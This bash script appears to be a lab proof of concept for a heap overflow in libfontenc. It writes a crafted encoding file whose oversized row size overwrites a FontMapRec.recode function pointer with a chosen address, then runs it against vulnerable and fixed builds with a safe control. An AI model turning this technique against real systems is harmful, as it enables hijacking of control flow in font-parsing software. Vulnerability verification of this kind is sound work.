#!/bin/bash
# W186: overwrite a live FontMapRec.recode function pointer through setCode()
# and call it via the public FontEncRecode() API.  Vulnerable / fixed / safe
# controls.  Requires build-vuln and build-fixed from realpath/rebuild.sh.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../../.." && pwd)
TMP="$BASE/realpath/tmp/fptr"
OUT="$HERE/out"
mkdir -p "$TMP/crafted" "$TMP/safe" "$OUT"

for variant in vuln fixed; do
    libdir="$BASE/build-$variant/out-plain"
    [ -f "$libdir/libfontenc.so" ] || { echo "MISSING $variant" >&2; exit 2; }
    cc -O0 -g -no-pie -Wall -I"$BASE/build-$variant/include" \
        "$HERE/marker.c" -L"$libdir" -Wl,-rpath,"$libdir" \
        -lfontenc -o "$TMP/marker-$variant"
done

# Non-PIE text address of the lab-chosen benign marker.
sym=$(nm "$TMP/marker-vuln" | awk '$3 == "benign_marker" {print $1}')
addr=$((16#$sym))
w0=$(printf '%x' $((addr & 0xffff)))
w1=$(printf '%x' $(((addr >> 16) & 0xffff)))
w2=$(printf '%x' $(((addr >> 32) & 0xffff)))
w3=$(printf '%x' $(((addr >> 48) & 0xffff)))
printf 'benign_marker=%s words=%s %s %s %s\n' "$sym" "$w0" "$w1" "$w2" "$w3" \
    | tee "$OUT/address.txt"

# row_size 258: from 0xfe34..0xfe37 -> idx 65584..65587, i.e. the four
# 16-bit halves of m3->recode at buffer_base + 0x20060 in the runner layout.
cat > "$TMP/crafted/crafted.enc" <<EOF
STARTENCODING heapobj
SIZE 256 258
STARTMAPPING unicode
0x0000 0x0001
ENDMAPPING
STARTMAPPING unicode
0xff00 0x1111
ENDMAPPING
STARTMAPPING unicode
0xff00 0xdead
ENDMAPPING
STARTMAPPING unicode
0xfe34 0x$w0
ENDMAPPING
STARTMAPPING unicode
0xfe35 0x$w1
ENDMAPPING
STARTMAPPING unicode
0xfe36 0x$w2
ENDMAPPING
STARTMAPPING unicode
0xfe37 0x$w3
ENDMAPPING
ENDENCODING
EOF

# Safe control: identical structure, row_size 256 so every index is in bounds.
cat > "$TMP/safe/safe.enc" <<'EOF'
STARTENCODING safe
SIZE 256 256
STARTMAPPING unicode
0x0000 0x0001
ENDMAPPING
STARTMAPPING unicode
0xff00 0x1111
ENDMAPPING
STARTMAPPING unicode
0xff00 0xdead
ENDMAPPING
STARTMAPPING unicode
0xfe34 0x1234
ENDMAPPING
STARTMAPPING unicode
0xfe35 0x5678
ENDMAPPING
STARTMAPPING unicode
0xfe36 0x9abc
ENDMAPPING
STARTMAPPING unicode
0xfe37 0xdef0
ENDMAPPING
ENDENCODING
EOF
printf '1\nheapobj crafted.enc\n' > "$TMP/crafted/encodings.dir"
printf '1\nsafe safe.enc\n' > "$TMP/safe/encodings.dir"

run_case() {
    tag=$1; bin=$2; charset=$3; dir=$4
    rc=0
    MALLOC_MMAP_THRESHOLD_=262144 FONT_ENCODINGS_DIRECTORY="$dir" \
        timeout 20 setarch x86_64 -R "$bin" "$charset" "$dir/dummy.pcf" \
        > "$OUT/$tag.txt" 2>&1 || rc=$?
    printf '\nRC=%s\n' "$rc" >> "$OUT/$tag.txt"
    printf '%s rc=%s\n' "$tag" "$rc"
}

run_case vuln-crafted "$TMP/marker-vuln" heapobj "$TMP/crafted"
run_case vuln-safe    "$TMP/marker-vuln" safe    "$TMP/safe"
run_case fixed-crafted "$TMP/marker-fixed" heapobj "$TMP/crafted"
